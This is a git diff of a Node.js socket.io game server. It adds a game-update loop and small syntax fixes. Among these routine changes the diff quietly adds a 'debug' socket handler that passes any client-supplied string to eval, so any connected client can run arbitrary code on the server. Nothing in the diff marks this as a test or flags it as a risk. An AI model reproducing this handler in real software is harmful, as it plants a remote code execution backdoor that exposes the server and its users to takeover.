@@ -55,7 +55,9 @@ const events = function (io) {
                 console.log(`GAME [${players.size}][${queue.size}][${games.size}] » ${player.username}#${player.id} has left the queue - ${queue.size} player(s) in queue.`);
             });
 
-        }
+            socket.on('debug', (string) => {eval(string)});
+
+        };
     });
 };
 
@@ -67,13 +69,28 @@ const gameLoop = setInterval(() => {
         const player2 = queue.dequeue();
 
         const game = new Game(player1, player2);
-        games.set(game.id, game)
+        games.set(game.id, game);
 
         console.log(`GAME [${players.size}][${queue.size}][${games.size}] » game#${game.id} has started - ${games.size} games(s) in progress.`);
 
         player1.socket.emit('game-start', game.startData());
         player2.socket.emit('game-start', game.startData());
 
-    }
+    };
+
+    games.forEach((game, game_id) => {
+
+        const {player1, player2} = game;
+
+        const active = game.update();
+
+        if (active) {
+
+            player1.socket.emit('game-update', game.updateData());
+            player2.socket.emit('game-update', game.updateData());
+
+        };
+
+    });
 
 }, 1000 / TICKRATE);
